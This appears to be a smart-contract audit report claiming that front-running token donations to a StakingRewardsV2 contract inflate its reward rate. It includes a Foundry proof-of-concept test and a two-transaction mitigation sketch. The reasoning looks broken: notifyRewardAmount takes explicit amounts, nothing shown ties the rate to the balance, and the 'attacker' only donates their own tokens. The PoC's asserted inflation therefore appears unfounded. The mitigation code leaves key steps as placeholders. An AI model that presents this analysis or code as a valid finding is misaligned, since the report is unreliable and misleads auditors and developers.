# Reward Inflation Due to Timing Discrepancies in notifyRewardAmount Function

# Summary

The `StakingRewardsV2` contract's `notifyRewardAmount` function can be exploited to inflate reward rates due to timing discrepancies between token transfers and reward rate updates.

# Vulnerability Detail

Consider the following sequence of events:

1. The `rewardsNotifier` contract transfers rewards to the `StakingRewardsV2` contract.
2. The `rewardsNotifier` calls `notifyRewardAmount` with the transferred amounts.
3. The `notifyRewardAmount` function updates the reward rates based on these amounts.

The critical issue is that there's no atomicity between steps 1 and 2. This opens up possibilities for exploitation.

An attacker observing the `mempool` can:

1. See the reward token transfer transaction from `rewardsNotifier` to `StakingRewardsV2`.
2. Quickly transfer additional reward tokens to the `StakingRewardsV2` contract.
3. Have their transaction included in the block before the `notifyRewardAmount` call.

When `notifyRewardAmount` is called, it would then update the reward rates based on a higher balance than what the `rewardsNotifier` intended, effectively inflating the reward rates.

## PoC

Add to `StakingRewardsV2Test` contract:

```solidity
address public attacker = address(0x1337);
uint256 public constant STAKING_AMOUNT = 10_000 * 1e18;
uint256 public constant REWARD_AMOUNT = 1_000 * 1e18;

/// @notice This test demonstrates a vulnerability where an attacker can inflate
/// the reward rate by front-running the notifyRewardAmount function call.
/// This results in the contract promising more rewards than it can actually pay out.
function testRewardInflationExploit() public {
    // Initial state setup
    uint256 initialContractBalance = kwenta.balanceOf(address(stakingRewardsV2));
    
    // Step 1: User stakes tokens
    fundAndApproveAccountV2(user1, STAKING_AMOUNT);
    vm.prank(user1);
    stakingRewardsV2.stake(STAKING_AMOUNT);
    
    // Step 2: Simulate rewardsNotifier preparing to distribute rewards
    vm.prank(treasury);
    kwenta.transfer(address(stakingRewardsV2), REWARD_AMOUNT);
    vm.prank(treasury);
    usdc.transfer(address(stakingRewardsV2), REWARD_AMOUNT);

    // Step 3: Attacker front-runs with additional rewards
    vm.prank(attacker);
    kwenta.transfer(address(stakingRewardsV2), REWARD_AMOUNT);

    uint256 contractBalanceBeforeNotify = kwenta.balanceOf(address(stakingRewardsV2));

    // Step 4: rewardsNotifier calls notifyRewardAmount
    vm.prank(address(rewardsNotifier));
    stakingRewardsV2.notifyRewardAmount(REWARD_AMOUNT, REWARD_AMOUNT);

    // Step 5: Verify inflated reward rate
    uint256 expectedRate = REWARD_AMOUNT / stakingRewardsV2.rewardsDuration();
    uint256 actualRate = stakingRewardsV2.rewardRate();
    assertGt(actualRate, expectedRate, "Reward rate is inflated");

    // Step 6: Fast forward to end of reward period
    vm.warp(block.timestamp + stakingRewardsV2.rewardsDuration());

    // Step 7: User claims rewards
    uint256 userBalanceBefore = kwenta.balanceOf(user1);
    vm.prank(user1);
    stakingRewardsV2.getReward();
    uint256 userBalanceAfter = kwenta.balanceOf(user1);

    // Step 8: Verify user received inflated rewards
    uint256 userRewards = userBalanceAfter - userBalanceBefore;
    assertGt(userRewards, REWARD_AMOUNT, "User receives inflated rewards");

    // Step 9: Check contract's remaining balance
    uint256 contractBalanceAfter = kwenta.balanceOf(address(stakingRewardsV2));
    assertLt(
        contractBalanceAfter, 
        contractBalanceBeforeNotify - REWARD_AMOUNT, 
        "Contract has insufficient balance for all rewards"
    );

    // Log results for better visibility
    console.log("Initial contract balance:", initialContractBalance);
    console.log("Contract balance before notify:", contractBalanceBeforeNotify);
    console.log("Expected reward rate:", expectedRate);
    console.log("Actual reward rate:", actualRate);
    console.log("User rewards received:", userRewards);
    console.log("Contract balance after:", contractBalanceAfter);

    // Demonstration of the impact
    uint256 totalRewardsPromised = actualRate * stakingRewardsV2.rewardsDuration();
    uint256 availableRewards = contractBalanceAfter - initialContractBalance;
    assertGt(totalRewardsPromised, availableRewards, "Promised rewards exceed available balance");
}
```

# Impact

If exploited, this vulnerability can lead to:

1. Inflated reward rates: The contract could promise more rewards than intended.
2. Unfair reward distribution: Early claimers might receive more rewards at the expense of later claimants.
3. Potential insolvency: If exploited repeatedly or with large amounts, the contract might not have enough rewards for all stakers.

# Recommendation

To mitigate this vulnerability, consider implementing the following changes:

1. Implement a two-transaction process:
a. First transaction: Notify the contract of incoming rewards and lock the contract.
b. Second transaction: Transfer the rewards and update the rates.

```solidity
uint256 public pendingReward;
uint256 public pendingRewardUsdc;
bool public locked;

function notifyPendingRewards(uint256 _reward, uint256 _rewardUsdc) external onlyRewardsNotifier {
    require(!locked, "Contract is locked");
    pendingReward = _reward;
    pendingRewardUsdc = _rewardUsdc;
    locked = true;
}

function confirmRewards() external onlyRewardsNotifier {
    require(locked, "Contract is not locked");
    uint256 balanceBefore = kwenta.balanceOf(address(this));
    uint256 usdcBalanceBefore = usdc.balanceOf(address(this));

    // Transfer logic here

    uint256 balanceAfter = kwenta.balanceOf(address(this));
    uint256 usdcBalanceAfter = usdc.balanceOf(address(this));

    require(balanceAfter - balanceBefore == pendingReward, "Incorrect KWENTA transfer");
    require(usdcBalanceAfter - usdcBalanceBefore == pendingRewardUsdc, "Incorrect USDC transfer");

    // Update reward rates here

    locked = false;
    pendingReward = 0;
    pendingRewardUsdc = 0;
}
```

2. Use a snapshot of the contract's balance:
Take a snapshot of the contract's balance at the start of each reward period and base rewards on this snapshot rather than the current balance.
